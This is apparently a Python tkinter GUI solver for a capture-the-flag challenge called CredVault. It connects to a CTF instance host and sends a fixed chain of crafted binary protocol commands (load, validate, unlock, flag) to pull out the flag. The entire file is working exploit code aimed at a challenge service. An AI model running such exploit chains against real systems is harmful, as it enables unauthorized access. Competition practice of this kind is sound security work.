#!/usr/bin/env python3
import socket, struct, threading
import tkinter as tk
from tkinter import scrolledtext, messagebox

def p32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)

def packet(cmd, payload=b""):
    return p32(cmd) + p32(len(payload)) + payload

def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise EOFError("connection closed while reading response")
        data += chunk
    return data

def recv_response(sock):
    status, length = struct.unpack("<II", recv_exact(sock, 8))
    body = recv_exact(sock, length) if length else b""
    return status, body

class SolverApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CredVault Exploit GUI")
        self.geometry("600x400")
        self.configure(bg="#0b0b0b")

        # Top frame for input
        top = tk.Frame(self, bg="#0b0b0b")
        top.pack(pady=10, fill=tk.X, padx=10)

        tk.Label(top, text="Target:", bg="#0b0b0b", fg="#ff9d00", font=("Courier", 12, "bold")).pack(side=tk.LEFT)
        self.host_entry = tk.Entry(top, bg="#1a1a1a", fg="#ece4d3", font=("Courier", 12), width=35, insertbackground="white")
        self.host_entry.insert(0, "credvault-230e3dc3c8ef.inst.omnictf.com")
        self.host_entry.pack(side=tk.LEFT, padx=5)

        tk.Label(top, text="Port:", bg="#0b0b0b", fg="#ff9d00", font=("Courier", 12, "bold")).pack(side=tk.LEFT)
        self.port_entry = tk.Entry(top, bg="#1a1a1a", fg="#ece4d3", font=("Courier", 12), width=6, insertbackground="white")
        self.port_entry.insert(0, "1337")
        self.port_entry.pack(side=tk.LEFT, padx=5)

        self.btn = tk.Button(top, text="HACK", bg="#ff9d00", fg="black", font=("Courier", 12, "bold"), command=self.start_exploit)
        self.btn.pack(side=tk.RIGHT, padx=5)

        # Output area
        self.log = scrolledtext.ScrolledText(self, bg="#050505", fg="#9aff6b", font=("Courier", 10), state=tk.DISABLED)
        self.log.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    def print_log(self, msg, color="#9aff6b"):
        self.log.config(state=tk.NORMAL)
        self.log.insert(tk.END, msg + "\n")
        self.log.see(tk.END)
        self.log.config(state=tk.DISABLED)
        self.update_idletasks()

    def start_exploit(self):
        self.btn.config(state=tk.DISABLED)
        self.log.config(state=tk.NORMAL)
        self.log.delete(1.0, tk.END)
        self.log.config(state=tk.DISABLED)
        host = self.host_entry.get().strip()
        try:
            port = int(self.port_entry.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Invalid port number")
            self.btn.config(state=tk.NORMAL)
            return
        
        threading.Thread(target=self.run_exploit, args=(host, port), daemon=True).start()

    def run_exploit(self, host, port):
        self.print_log(f"[*] Targeting {host}:{port}...", "#ff9d00")
        
        payload = b"".join(p32(x) for x in (0xCA110001, 0xCA110042, 1, 0, 0, 0x42))
        commands = [
            ("load",     0xCA000002, payload),
            ("validate", 0xCA000003, b""),
            ("unlock",   0xCA000004, b""),
            ("flag",     0xCA000005, b""),
        ]

        try:
            with socket.create_connection((host, port)) as s:
                self.print_log("[+] Connected!")
                for name, cmd, body in commands:
                    self.print_log(f"[*] Sending CMD: {name.upper()}...", "#ff9d00")
                    s.sendall(packet(cmd, body))
                    status, response = recv_response(s)
                    self.print_log(f"    [OK] status=0x{status:08x} length={len(response)}")
                    
                    if status != 0:
                        self.print_log(f"[-] {name.upper()} failed!", "#ff6b6b")
                        break
                    
                    if response:
                        self.print_log(f"[*] RESPONSE:", "#6bb6ff")
                        self.print_log(response.decode(errors="replace"), "#ff6b6b") # Red for flag
                
                self.print_log("[+] Exploit chain complete.", "#ff9d00")

        except Exception as e:
            self.print_log(f"[-] Error: {e}", "#ff6b6b")
        
        finally:
            self.btn.config(state=tk.NORMAL)

if __name__ == "__main__":
    app = SolverApp()
    app.mainloop()
